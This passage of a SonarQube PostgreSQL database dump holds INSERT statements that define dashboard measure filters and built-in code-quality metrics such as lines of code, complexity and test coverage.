INSERT INTO loaded_templates (id, kee, template_type) VALUES (17, 'UpdateUsersLocal', 'ONE_SHOT_TASK');


--
-- Data for Name: manual_measures; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: measure_filter_favourites; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: measure_filters; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO measure_filters (id, name, user_id, shared, description, data, created_at, updated_at) VALUES (1, 'Projects', NULL, true, NULL, 'display=list|qualifiers=TRK|cols=metric:alert_status,name,version,metric:ncloc,metric:bugs,metric:vulnerabilities,metric:code_smells,date', '2017-11-16 07:37:05.872', '2017-11-16 07:37:05.872');
INSERT INTO measure_filters (id, name, user_id, shared, description, data, created_at, updated_at) VALUES (2, 'My favourites', NULL, true, NULL, 'display=list|onFavourites=true|cols=metric:alert_status,name,date', '2017-11-16 07:37:05.881', '2017-11-16 07:37:05.881');


--
-- Data for Name: metrics; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (1, 'lines', 'Lines', -1, 'Size', 'Lines', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (26, 'class_complexity_distribution', 'Classes distribution /complexity', 0, 'Complexity', 'Class Distribution / Complexity', true, 'DISTRIB', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (27, 'function_complexity_distribution', 'Functions distribution /complexity', 0, 'Complexity', 'Function Distribution / Complexity', true, 'DISTRIB', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (28, 'file_complexity_distribution', 'Files distribution /complexity', 0, 'Complexity', 'File Distribution / Complexity', true, 'DISTRIB', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (30, 'test_execution_time', 'Execution duration of unit tests', -1, 'Coverage', 'Unit Test Duration', false, 'MILLISEC', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (31, 'test_errors', 'Number of unit test errors', -1, 'Coverage', 'Unit Test Errors', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (32, 'skipped_tests', 'Number of skipped unit tests', -1, 'Coverage', 'Skipped Unit Tests', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (33, 'test_failures', 'Number of unit test failures', -1, 'Coverage', 'Unit Test Failures', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (34, 'test_success_density', 'Density of successful unit tests', 1, 'Coverage', 'Unit Test Success (%)', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, true, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (35, 'test_data', 'Unit tests details', -1, 'Coverage', 'Unit Test Details', false, 'DATA', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (36, 'coverage', 'Coverage by unit tests', 1, 'Coverage', 'Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (87, 'duplicated_lines', 'Duplicated lines', -1, 'Duplications', 'Duplicated Lines', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (2, 'generated_lines', 'Number of generated lines', -1, 'Size', 'Generated Lines', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (137, 'burned_budget', NULL, 0, 'Management', 'Burned budget', false, 'FLOAT', true, true, NULL, NULL, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (138, 'business_value', NULL, 1, 'Management', 'Business value', true, 'FLOAT', true, true, NULL, NULL, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (139, 'team_size', NULL, 0, 'Management', 'Team size', false, 'INT', true, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (3, 'ncloc', 'Non Commenting Lines of Code', -1, 'Size', 'Lines of Code', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (4, 'ncloc_language_distribution', 'Non Commenting Lines of Code Distributed By Language', -1, 'Size', 'Lines of Code Per Language', false, 'DATA', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (5, 'generated_ncloc', 'Generated non Commenting Lines of Code', -1, 'Size', 'Generated Lines of Code', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (6, 'classes', 'Classes', -1, 'Size', 'Classes', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (7, 'files', 'Number of files', -1, 'Size', 'Files', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (8, 'directories', 'Directories', -1, 'Size', 'Directories', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (9, 'packages', 'Packages', -1, 'Size', 'Packages', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (10, 'functions', 'Functions', -1, 'Size', 'Functions', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (11, 'accessors', 'Accessors', -1, 'Size', 'Accessors', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (12, 'statements', 'Number of statements', -1, 'Size', 'Statements', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (13, 'public_api', 'Public API', -1, 'Documentation', 'Public API', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (14, 'projects', 'Number of projects', -1, 'Size', 'Projects', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (15, 'comment_lines', 'Number of comment lines', 1, 'Documentation', 'Comment Lines', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (16, 'comment_lines_density', 'Comments balanced by ncloc + comment lines', 1, 'Documentation', 'Comments (%)', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (17, 'public_documented_api_density', 'Public documented classes and functions balanced by ncloc', 1, 'Documentation', 'Public Documented API (%)', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, true, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (18, 'public_undocumented_api', 'Public undocumented classes, functions and variables', -1, 'Documentation', 'Public Undocumented API', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (19, 'commented_out_code_lines', 'Commented lines of code', -1, 'Documentation', 'Commented-Out LOC', true, 'INT', false, true, NULL, 0.00000000000000000000, true, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (20, 'complexity', 'Cyclomatic complexity', -1, 'Complexity', 'Complexity', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (21, 'file_complexity', 'Complexity average by file', -1, 'Complexity', 'Complexity / File', true, 'FLOAT', false, true, NULL, NULL, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (22, 'complexity_in_classes', 'Cyclomatic complexity in classes', -1, 'Complexity', 'Complexity in Classes', false, 'INT', false, true, NULL, NULL, false, true, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (23, 'class_complexity', 'Complexity average by class', -1, 'Complexity', 'Complexity / Class', true, 'FLOAT', false, true, NULL, NULL, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (24, 'complexity_in_functions', 'Cyclomatic complexity in functions', -1, 'Complexity', 'Complexity in Functions', false, 'INT', false, true, NULL, NULL, false, true, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (25, 'function_complexity', 'Complexity average by function', -1, 'Complexity', 'Complexity / Function', true, 'FLOAT', false, true, NULL, NULL, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (29, 'tests', 'Number of unit tests', -1, 'Coverage', 'Unit Tests', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (37, 'new_coverage', 'Coverage of new/changed code', 1, 'Coverage', 'Coverage on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (38, 'lines_to_cover', 'Lines to cover', 1, 'Coverage', 'Lines to Cover', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (39, 'new_lines_to_cover', 'Lines to cover on new code', -1, 'Coverage', 'Lines to Cover on New Code', false, 'INT', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (40, 'uncovered_lines', 'Uncovered lines', -1, 'Coverage', 'Uncovered Lines', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (41, 'new_uncovered_lines', 'Uncovered lines on new code', -1, 'Coverage', 'Uncovered Lines on New Code', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (42, 'line_coverage', 'Line coverage', 1, 'Coverage', 'Line Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (43, 'new_line_coverage', 'Line coverage of added/changed code', 1, 'Coverage', 'Line Coverage on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (44, 'coverage_line_hits_data', 'Coverage hits by line', 0, 'Coverage', 'Coverage Hits by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (45, 'conditions_to_cover', 'Branches to cover', 0, 'Coverage', 'Branches to Cover', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (46, 'new_conditions_to_cover', 'Branches to cover on New Code', 0, 'Coverage', 'Branches to Cover on New Code', false, 'INT', false, true, NULL, NULL, false, true, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (47, 'uncovered_conditions', 'Uncovered conditions', -1, 'Coverage', 'Uncovered Conditions', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (48, 'new_uncovered_conditions', 'Uncovered conditions on new code', -1, 'Coverage', 'Uncovered Conditions on New Code', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (49, 'branch_coverage', 'Condition coverage', 1, 'Coverage', 'Condition Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (50, 'new_branch_coverage', 'Condition coverage of new/changed code', 1, 'Coverage', 'Condition Coverage on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (51, 'conditions_by_line', 'Conditions by line', 0, 'Coverage', 'Conditions by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (52, 'covered_conditions_by_line', 'Covered conditions by line', 0, 'Coverage', 'Covered Conditions by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (53, 'it_coverage', 'Integration tests coverage', 1, 'Coverage', 'IT Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (54, 'new_it_coverage', 'Integration tests coverage of new/changed code', 1, 'Coverage', 'Coverage by IT on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (55, 'it_lines_to_cover', 'Lines to cover by Integration Tests', 1, 'Coverage', 'IT Lines to Cover', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (56, 'new_it_lines_to_cover', 'Lines to cover on new code by integration tests', -1, 'Coverage', 'Lines to Cover by IT on New Code', false, 'INT', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (57, 'it_uncovered_lines', 'Uncovered lines by integration tests', -1, 'Coverage', 'IT Uncovered Lines', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (58, 'new_it_uncovered_lines', 'New lines that are not covered by integration tests', -1, 'Coverage', 'Uncovered Lines by IT on New Code', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (59, 'it_line_coverage', 'Line coverage by integration tests', 1, 'Coverage', 'IT Line Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (60, 'new_it_line_coverage', 'Integration tests line coverage of added/changed code', 1, 'Coverage', 'Line Coverage by IT on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (61, 'it_coverage_line_hits_data', 'Coverage hits by line by integration tests', 0, 'Coverage', 'IT Coverage Hits by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (62, 'it_conditions_to_cover', 'Integration Tests conditions to cover', 1, 'Coverage', 'IT Branches to Cover', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (63, 'new_it_conditions_to_cover', 'Branches to cover by Integration Tests on New Code', 0, 'Coverage', 'Branches to Cover by IT on New Code', false, 'INT', false, true, NULL, NULL, false, true, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (64, 'it_uncovered_conditions', 'Uncovered conditions by integration tests', -1, 'Coverage', 'IT Uncovered Conditions', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (65, 'new_it_uncovered_conditions', 'New conditions that are not covered by integration tests', -1, 'Coverage', 'Uncovered Conditions by IT on New Code', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (66, 'it_branch_coverage', 'Condition coverage by integration tests', 1, 'Coverage', 'IT Condition Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (67, 'new_it_branch_coverage', 'Integration tests condition coverage of new/changed code', 1, 'Coverage', 'Condition Coverage by IT on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (68, 'it_conditions_by_line', 'IT conditions by line', 0, 'Coverage', 'IT Conditions by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (69, 'it_covered_conditions_by_line', 'IT covered conditions by line', 0, 'Coverage', 'IT Covered Conditions by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (70, 'overall_coverage', 'Overall test coverage', 1, 'Coverage', 'Overall Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (71, 'new_overall_coverage', 'Overall coverage of new/changed code', 1, 'Coverage', 'Overall Coverage on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (72, 'overall_lines_to_cover', 'Overall lines to cover by all tests', 1, 'Coverage', 'Overall Lines to Cover', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (73, 'new_overall_lines_to_cover', 'New lines to cover by all tests', -1, 'Coverage', 'Overall Lines to Cover on New Code', false, 'INT', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (74, 'overall_uncovered_lines', 'Uncovered lines by all tests', -1, 'Coverage', 'Overall Uncovered Lines', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (75, 'new_overall_uncovered_lines', 'New lines that are not covered by any tests', -1, 'Coverage', 'Overall Uncovered Lines on New Code', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (76, 'overall_line_coverage', 'Line coverage by all tests', 1, 'Coverage', 'Overall Line Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (77, 'new_overall_line_coverage', 'Line coverage of added/changed code by all tests', 1, 'Coverage', 'Overall Line Coverage on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (78, 'overall_coverage_line_hits_data', 'Coverage hits by all tests and by line', 0, 'Coverage', 'Overall Coverage Hits by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (79, 'overall_conditions_to_cover', 'Branches to cover by all tests', 1, 'Coverage', 'Overall Branches to Cover', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (80, 'new_overall_conditions_to_cover', 'New branches to cover by all tests', 0, 'Coverage', 'Overall Branches to Cover on New Code', false, 'INT', false, true, NULL, NULL, false, true, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (81, 'overall_uncovered_conditions', 'Uncovered conditions by all tests', -1, 'Coverage', 'Overall Uncovered Conditions', false, 'INT', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (82, 'new_overall_uncovered_conditions', 'New conditions that are not covered by any test', -1, 'Coverage', 'Overall Uncovered Conditions on New Code', false, 'INT', false, true, NULL, 0.00000000000000000000, false, false, true, NULL);
